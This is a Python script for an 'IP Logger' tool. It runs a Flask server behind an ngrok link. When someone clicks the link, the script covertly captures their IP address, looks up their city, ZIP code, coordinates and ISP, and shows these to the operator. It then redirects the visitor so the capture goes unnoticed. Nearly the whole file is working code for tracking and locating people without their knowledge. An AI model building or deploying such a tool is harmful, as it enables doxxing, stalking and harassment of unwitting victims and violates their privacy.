import os
import sys
import time
import requests
from flask import Flask, request, redirect
from termcolor import colored

app = Flask(__name__)

redirect_url = "https://www.example.com"

ascii_art = colored(r'''
   _____  _______      _____   .____                                      
  /  |  | \   _  \    /  |  |  |    |    ____   ____   ____   ___________ 
 /   |  |_/  /_\  \  /   |  |_ |    |   /  _ \ / ___\ / ___\_/ __ \_  __ \
/    ^   /\  \_/   \/    ^   / |    |__(  <_> ) /_/  > /_/  >  ___/|  | \/
\____   |  \_____  /\____   |  |_______ \____/\___  /\___  / \___  >__|   
     |__|        \/      |__|          \/    /_____//_____/      \/       
''', 'blue')

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        if response['status'] == 'success':
            return {
                "IP": ip,
                "Country": response.get('country'),
                "Region": response.get('regionName'),
                "City": response.get('city'),
                "ZIP": response.get('zip'),
                "Latitude": response.get('lat'),
                "Longitude": response.get('lon'),
                "Timezone": response.get('timezone'),
                "ISP": response.get('isp'),
                "Org": response.get('org')
            }
        else:
            return {"IP": ip, "Error": "Unable to fetch details"}
    except Exception as e:
        return {"IP": ip, "Error": str(e)}

def loading_animation():
    sys.stdout.write("Loading")
    for i in range(3):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(0.5)
    sys.stdout.write("\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

@app.route('/')
def log_ip():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ip_info = get_ip_info(user_ip)

    print("\n--- New Visitor ---")
    for key, value in ip_info.items():
        print(f"{key}: {value}")
    print("-------------------\n")

    return redirect(redirect_url)

def menu():
    clear_screen()
    print(ascii_art)
    print("- Made by Y2K -\n")
    print("IP Logger Menu")
    print("1. Generate a ngrok link")
    print("2. Set redirect URL")
    print("3. Exit")
    choice = input("\nEnter your choice: ")

    clear_screen()

    if choice == '1':
        print(ascii_art)
        print("- Made by Y2K -\n")
        loading_animation()
        print("\nStarting Flask server...")
        print("Expose the app using ngrok by running the following command in another terminal:\n")
        print("ngrok http 5000")
        app.run(host='0.0.0.0', port=5000)
    elif choice == '2':
        global redirect_url
        redirect_url = input("Enter the redirect URL (with http/https): ")
        print(f"\nRedirect URL set to: {redirect_url}\n")
    elif choice == '3':
        print("Exiting...")
        exit()
    else:
        print("Invalid choice, try again.")
        menu()

if __name__ == "__main__":
    while True:
        menu()
